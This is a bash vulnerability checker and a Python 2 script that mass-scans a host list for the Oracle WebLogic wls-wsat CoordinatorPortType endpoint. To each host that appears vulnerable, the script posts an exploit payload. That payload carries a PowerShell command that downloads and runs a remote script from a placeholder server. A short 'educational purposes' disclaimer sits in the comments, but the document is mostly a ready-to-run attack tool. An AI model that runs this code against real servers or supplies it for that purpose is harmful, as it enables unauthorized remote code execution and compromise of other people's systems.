'''
#!/bin/bash
#Execute as ./scanner.sh $host
#$HOST should be in URL format -- Proto://IP:Port (https://111.222.333.44:8000)
HOST=$1
echo -e "\e[34m[*] Scanning $HOST\e[0m"
curl $HOST/wls-wsat/CoordinatorPortType -k -s -m1 | grep "<h1>Web Services"
RESULT=$?
if [ $RESULT -eq 0 ]; then
echo -e "\e[91m[*] Potential Vuln: $HOST\e[0m"
echo "$HOST" >> vulns.txt
else
echo -e "\e[92m[*] Cleared: $HOST\e[0m"
fi
echo "$HOST" >> processed.txt
sleep 1
'''
#this is only a slow checker for vuln and will be implemented in another module after faster detection is made to identify server
#for now use this as is same way he showed you guys above and obv substitute file names or name them to match f1 the  files in build host list 
#this doesn't even need to be said don't be an idiot this is for educational purposes don't abuse it hack to learn not earn
#do not run this on something without permission as it's not a toy i take no responsibility for any actions by anyone using this immorally
import requests 
import coloredlogs, logging
from payloads import *

logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG', logger=logger)
    
def build_hostlist():
    hosts_local = []
    with open('web_logic_hosts.txt', 'r') as f:
         for line in map(lambda line: line.rstrip('\n'), f):
             hosts_local.append(line)
    return hosts_local



def do_post(url_in,command_in):
    
    payload_url = url_in + "/wls-wsat/CoordinatorPortType"
    payload_header = {'content-type': 'text/xml'}
    result = requests.post(payload_url,payload_command(command_in),headers = payload_header,verify=False)
    #print(result.request.body)
    if result.status_code == 500:
       logger.debug("Command Executed\n")
        
    else:
        logger.error("Something Went Wrong\n")
        
def main():
    command = "powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://SOMESERVERHERE/GOTPAYLOAD.ps1')"
    vuln_list = []
    hosts = build_hostlist()
    f1 = open('results.txt','w')
    Web_logic_String = "<h1>Web Services</h1>"
  
    for url in hosts:
        
	logger.info("Scanning Host:" + url)
        #print url
        Result = requests.get(url + "/wls-wsat/CoordinatorPortType")
        #print Result.status_code
        #print Result.content
        if Web_logic_String in Result.content:
            #print url
            logger.info("Possibly Vulnerable")
            f1.write(url + "\n")
            vuln_list.append(url)
            #print command
         

        else:
	    pass
	    
       

   
    f1.close()
    for targets in vuln_list:
        print targets + "\n"
        do_post(targets,command)
     

        
    logger.info("Shutting Down!!!!!")

if __name__ == '__main__':
   main()
